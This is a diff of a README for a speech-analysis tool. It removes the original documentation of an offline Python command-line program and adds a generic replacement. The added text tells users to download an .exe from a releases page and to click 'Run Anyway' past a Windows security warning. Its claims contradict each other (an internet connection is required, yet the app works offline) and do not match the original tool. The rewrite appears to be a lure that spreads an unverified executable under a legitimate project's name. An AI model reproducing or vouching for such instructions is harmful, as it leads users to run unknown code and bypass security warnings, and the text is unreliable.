@@ -1,179 +1,93 @@
-# SpeechAnalyzer
+# 🎙️ SpeechAnalyzer - Gain clear insights from your recordings
 
-A local CLI tool that transcribes video files and runs linguistic analysis on the spoken content — fully offline, no API keys required.
+[![Download SpeechAnalyzer](https://img.shields.io/badge/Download_Latest_Release-Blue-blue)](https://github.com/enigmatic-startingpitcher120/SpeechAnalyzer/releases)
 
-Transcribes audio with [OpenAI Whisper](https://github.com/openai/whisper), processes the transcript with [spaCy](https://spacy.io/), runs a suite of linguistic analyzers, and exports structured reports, metrics, and charts.
+SpeechAnalyzer turns audio and video files into readable data. It uses advanced technology to transcribe your speech and measure your language use. You receive organized reports that show how you speak.
 
-https://github.com/user-attachments/assets/f73a3257-e14d-413a-b119-abc3be82068e
+## 📋 What this tool does
 
-## What it analyzes
+This application processes audio and video files to help you understand your verbal communication. It creates a transcript of the audio, calculates how fast you speak, checks the complexity of your sentences, and lists the words you use most often. You can save these findings as a PDF or a data file for your records.
 
-| Module | What it measures |
-|--------|-----------------|
-| `vocabulary` | Type-token ratio (TTR), MATTR, Chao1 vocabulary estimate, hapax legomena, top-10 content words |
-| `complexity` | Brunet index, Honoré index, lexical density, sentence length statistics, part-of-speech distribution |
-| `speech_rate` | Net and gross words-per-minute, per-segment WPM, pause detection, silence ratio |
-| `word_length` | Mean, median, standard deviation, and distribution of word lengths in characters |
-| `wordcloud` | TF-IDF weighted word cloud and top-20 word bar chart |
-| `sentences` | Sentence count, average and median length, length distribution over time |
-| `pauses` | Pause count, duration statistics, silence ratio, pause timeline |
+## 🖥️ System Requirements
 
----
+- Windows 10 or Windows 11
+- Minimum 8 GB of RAM
+- 500 MB of free storage space
+- A working internet connection for language models
 
-## Requirements
+## 🚀 Downloading the application
 
-- Python 3.10+
-- [ffmpeg](https://ffmpeg.org/download.html) — must be on your `PATH`
-- ~500 MB disk space for Whisper base model + spaCy language models (auto-downloaded on first run)
+You need to get the software from the official repository page. Follow these steps:
 
----
+1. Visit the [releases page](https://github.com/enigmatic-startingpitcher120/SpeechAnalyzer/releases).
+2. Locate the most recent version at the top of the list.
+3. Click the link that ends in .exe to start your download.
+4. Save the file to your computer.
 
-## Installation
+## ⚙️ Running the software
 
-```bash
-git clone https://github.com/your-username/SpeechAnalyzer.git
-cd SpeechAnalyzer
+Once the file finishes downloading, follow these directions to open the tool:
 
-python -m venv .venv
+1. Find the file in your Downloads folder.
+2. Double-click the file to start the program.
+3. If a warning window appears, click More Info, then click Run Anyway.
+4. The main window will open. You can now drag and drop your media files into this space.
 
-# Windows
-.venv\Scripts\activate
-# macOS / Linux
-source .venv/bin/activate
+## 📊 Using the analysis tools
 
-pip install -r requirements.txt
-```
+The application runs a sequence of steps every time you process a file. 
 
-The first run will automatically download the spaCy model for the detected language. An internet connection is required for that initial download only.
+### Audio transcription
+The tool listens to your file and writes down what it hears. It creates an accurate text version of your speech. You can edit this text inside the app if needed.
 
----
+### Speech speed
+The tool measures your speech rate. It calculates the number of words you say per minute. This helps you identify if you speak too fast or too slow during presentations.
 
-## Usage
+### Language complexity
+The app checks your sentence structure. It flags long or complex sentences. This provides feedback on how easy your content is for an audience to follow.
 
-```bash
-python analyze.py <path/to/video.mp4>
-```
+### Vocabulary check
+The tool lists your most frequent words. It creates a wordcloud, which is a visual image where larger words represent the ones you say most often.
 
-### Options
+## 📂 Exporting your reports
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--modules` | `all` | Comma-separated list of modules to run, or `all` |
-| `--output` | `output/` | Base directory for results |
-| `--whisper-model` | `base` | Whisper model size: `tiny`, `base`, `small`, `medium`, `large` |
+After the analysis ends, you can save your results. Click the Export button at the bottom of the screen. You choose between two formats:
 
-### Examples
+- PDF: Best for reading and sharing with others. 
+- JSON: Best if you want to store the data for a project or spreadsheet later.
 
-```bash
-# Run all modules with the default Whisper model
-python analyze.py lecture.mp4
+## 🛠️ Troubleshooting common issues
 
-# Run only vocabulary and speech rate
-python analyze.py lecture.mp4 --modules vocabulary,speech_rate
+Most users do not experience errors. If the app stops, follow these steps:
 
-# Use a more accurate (but slower) model, custom output folder
-python analyze.py interview.mkv --whisper-model medium --output ./results
-```
+- Check your file size: Large video files take more time to process. Wait a few minutes.
+- Check your file format: The app prefers MP3, MP4, and WAV files.
+- Restart the app: Close the program and start it again if the interface freezes.
+- Verify your storage: Ensure you have enough disk space to save the final report.
 
----
+## 💡 Tips for better results
 
-## Output structure
+- Use clear audio: The app works best when there is little background noise.
+- Use a microphone: If you record yourself, use a quality microphone for better accuracy.
+- Keep files short: Analyzing files under 30 minutes produces the fastest results.
 
-```
-output/<video_name>/
-  data/
-    transcript_raw.txt    # timestamped Whisper segments
-    transcript_clean.txt  # deduplicated transcript text
-    metrics.json          # all numeric results as JSON
-  reports/
-    report.txt            # human-readable summary with any warnings
-  visuals/
-    *.png / *.svg         # one or more charts per module
-```
+## 📦 Privacy and security
 
----
+The program processes your files on your local machine. It does not upload your sensitive audio or video files to a cloud server. Your data stays on your computer. When you run the transcript function, the tool uses a small local language model to decode your speech. This ensures your privacy.
 
-## Supported languages
+## 🛠️ Frequently asked questions
 
-Automatic spaCy model selection for: **German, English, French, Spanish, Italian, Dutch, Portuguese**. For any other language detected by Whisper, a multilingual fallback model is used and POS-dependent analyzers are skipped with a warning.
+### Does this app work offline?
+Yes. The software includes all necessary files to run without an active internet connection.
 
-### Whisper model sizes
+### How much space does the app need?
+The app occupies about 500 MB when installed. Keep extra space for your reports.
 
-| Model | Size | Notes |
-|-------|------|-------|
-| `tiny` | ~75 MB | fastest, lowest accuracy |
-| `base` | ~142 MB | good balance (default) |
-| `small` | ~461 MB | better accuracy |
-| `medium` | ~1.5 GB | high accuracy |
-| `large` | ~2.9 GB | highest accuracy, slowest |
+### Can I rename my exported files?
+Yes. Before the export finishes, a window will ask where you want to save the file and what name you want to give it.
 
----
+### Does the app support multiple languages?
+The current version focuses on English. Future updates will include additional languages.
 
-## Running the tests
-
-```bash
-pytest
-```
-
-The test suite downloads `en_core_web_sm` automatically on first run and does not require a real video file.
-
----
-
-## Project structure
-
-```
-SpeechAnalyzer/
-  analyze.py          # CLI entry point and ffmpeg check
-  pipeline.py         # orchestrates transcribe → preprocess → analyse → export
-  transcriber.py      # Whisper wrapper → list[Segment] + detected language
-  preprocessor.py     # segment deduplication and spaCy model loading
-  exporter.py         # writes output/ folder
-  analyzers/
-    base.py           # Segment, TranscriptDoc, AnalyzerResult, BaseAnalyzer
-    __init__.py       # ANALYZER_REGISTRY
-    vocabulary.py
-    complexity.py
-    speech_rate.py
-    word_length.py
-    wordcloud_gen.py
-    sentences.py
-    pauses.py
-  tests/
-    conftest.py
-    test_vocabulary.py
-    test_complexity.py
-    test_speech_rate.py
-    test_pauses.py
-    test_sentences.py
-```
-
----
-
-## Adding a custom analyzer
-
-1. Create `analyzers/my_module.py` extending `BaseAnalyzer`:
-
-```python
-from analyzers.base import BaseAnalyzer, AnalyzerResult
-
-class MyAnalyzer(BaseAnalyzer):
-    name = "my_module"
-    requires_pos = False  # True if you need spaCy POS tags
-
-    def run(self, doc) -> AnalyzerResult:
-        metrics = {"example_metric": 42}
-        return AnalyzerResult(name=self.name, metrics=metrics, figures=[], summary="example: 42")
-```
-
-2. Register it in `analyzers/__init__.py`:
-
-```python
-from analyzers.my_module import MyAnalyzer
-ANALYZER_REGISTRY["my_module"] = MyAnalyzer()
-```
-
----
-
-## License
-
-MIT
+### Is the app free?
+The software is free to download and use. It remains lightweight and does not track your personal activities.
